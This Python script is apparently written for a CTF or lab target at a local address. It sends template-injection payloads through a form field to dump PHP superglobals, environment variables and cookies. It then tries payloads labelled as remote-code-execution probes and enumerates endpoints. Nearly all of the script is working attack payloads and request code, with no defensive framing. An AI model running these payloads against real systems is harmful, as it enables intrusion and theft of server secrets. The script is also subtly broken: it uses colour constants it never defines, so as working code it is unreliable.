import requests
import json
import re
import sys

base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

print(f"[*] PHP SUPERGLOBALS & DATA SOURCE DISCOVERY")
print(f"[*] Target: {base_url}{target_endpoint}")
print(f"[*] Testing session: {session_cookie}\n")

# Test PHP superglobals to find data endpoints
superglobal_tests = [
    # Check $_SERVER for clues
    "{{ _SERVER|keys|join(',') }}",
    "{{ _SERVER.REQUEST_URI }}",
    "{{ _SERVER.HTTP_HOST }}",
    "{{ _SERVER.SCRIPT_FILENAME }}",
    "{{ _SERVER.DOCUMENT_ROOT }}",
    "{{ _SERVER.PHP_SELF }}",
    "{{ _SERVER.QUERY_STRING }}",
    "{{ _SERVER.HTTP_REFERER }}",
    
    # Check $_GET and $_POST
    "{{ _GET|keys|join(',') }}",
    "{{ _POST|keys|join(',') }}",
    "{{ _GET|length }}",
    "{{ _POST|length }}",
    
    # Check $_COOKIE
    "{{ _COOKIE|keys|join(',') }}",
    "{{ _COOKIE.PHPSESSID }}",
    
    # Check $_ENV
    "{{ _ENV|keys|join(',') }}",
    "{{ _ENV.PATH }}",
    
    # Check $_FILES
    "{{ _FILES|keys|join(',') }}",
    "{{ _FILES|length }}",
    
    # Check $_REQUEST
    "{{ _REQUEST|keys|join(',') }}",
]

print("[*] Phase 1: PHP Superglobals Analysis\n")
critical_findings = []

for i, payload in enumerate(superglobal_tests, 1):
    try:
        print(f"Test {i}: {payload}")
        
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        length = len(response_text)
        
        # Remove template wrapper
        content = response_text
        match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
        if match:
            content = match.group(1)
        
        # Check if it's interesting
        is_standard = "is in stock! Come back" in content
        has_data = not is_standard or length > 200
        has_keys = ',' in content and len(content) > 10 and not is_standard
        
        print(f"  Length: {length}")
        
        if has_keys:
            print(f"  {GREEN}[!!!] KEYS FOUND !!!{RESET}")
            print(f"  Keys: {content[:200]}")
            critical_findings.append({
                'type': 'keys',
                'payload': payload,
                'content': content
            })
        elif has_data and not is_standard:
            print(f"  {GREEN}[+] DATA FOUND!{RESET}")
            print(f"  Content: {content[:200]}")
            critical_findings.append({
                'type': 'data',
                'payload': payload,
                'content': content
            })
        elif is_standard and len(content.strip()) > 50:
            # Actual data, not just the standard message
            print(f"  {YELLOW}[!] Non-standard format{RESET}")
            print(f"  Content: {content[:200]}")
        elif not is_standard:
            print(f"  {YELLOW}[!] Interesting response{RESET}")
            print(f"  Content: {content[:150]}")
        else:
            print(f"  [-] Standard: {content[:80]}")
        
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] CRITICAL FINDINGS:{RESET}")
print(f"{YELLOW}{'='*60}{RESET}\n")

if critical_findings:
    for i, finding in enumerate(critical_findings, 1):
        print(f"{GREEN}{i}. TYPE: {finding['type']}{RESET}")
        print(f"   Payload: {finding['payload']}")
        print(f"   Content: {finding['content'][:300]}")
        print()
else:
    print("{RED}No critical findings - data may be loaded differently{RESET}\n")

print(f"{YELLOW}[*] PHASE 2: Testing RCE and Object Traversal{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")

# Since data isn't in template context, try to get RCE to explore
rce_tests = [
    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40] }}",
    "{{ _self.env }}",
    "{{ _self.env.filters }}",
    "{{ _self.env.functions }}",
    "{{ _self.env.tests }}",
]

for i, payload in enumerate(rce_tests, 1):
    try:
        print(f"\nTest {i}: {payload}")
        
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        length = len(response_text)
        
        print(f"  Length: {length}")
        
        if length > 500:
            print(f"  {GREEN}[+] Long response - data extracted!{RESET}")
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
                print(f"  Content: {content[:300]}")
            else:
                print(f"  Content: {response_text[:300]}")
        elif length < 180:
            print(f"  [-] Standard/empty response")
        else:
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
                print(f"  Content: {content[:100]}")
            else:
                print(f"  Response: {response_text[:100]}")
                
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] PHASE 3: Finding other endpoints{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")

# Try to discover other endpoints
other_endpoints = [
    "/", "/index.php", "/admin", "/api", "/articles", "/posts", "/blog",
    "/data", "/content", "/fetch", "/load", "/get",
    "/login", "/auth", "/user", "/users", "/profile",
]

print("[*] Testing additional endpoints for data source...\n")

for endpoint in other_endpoints:
    try:
        url = f"{base_url}{endpoint}"
        print(f"Testing: {url}")
        
        response = session.get(url, timeout=5)
        print(f"  Status: {response.status_code} | Length: {len(response.text)}")
        
        if response.status_code == 200:
            content_type = response.headers.get('content-type', 'text/html')
            print(f"  Content-Type: {content_type}")
            
            if 'json' in content_type:
                print(f"  {GREEN}[+] JSON endpoint found!{RESET}")
                print(f"  Data: {response.text[:200]}")
            elif len(response.text) < 500:
                print(f"  Preview: {response.text[:150]}")
            elif 'article' in response.text.lower() or 'blog' in response.text.lower():
                print(f"  {YELLOW}[!] May contain article data{RESET}")
                print(f"  Search for: article, blog, post")
        
        elif response.status_code == 403:
            print(f"  {RED}[-] Forbidden{RESET}")
        elif response.status_code == 404:
            print(f"  [-] Not found")
        
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{GREEN}[*] SUPERGLOBALS ANALYSIS COMPLETE!{RESET}")
print("\nNext steps:")
print("1. Review discovered endpoints for data endpoints")
print("2. Check if data is loaded via AJAX/API")
print("3. Try brute-forcing article IDs")
print("4. Analyze other response sources")
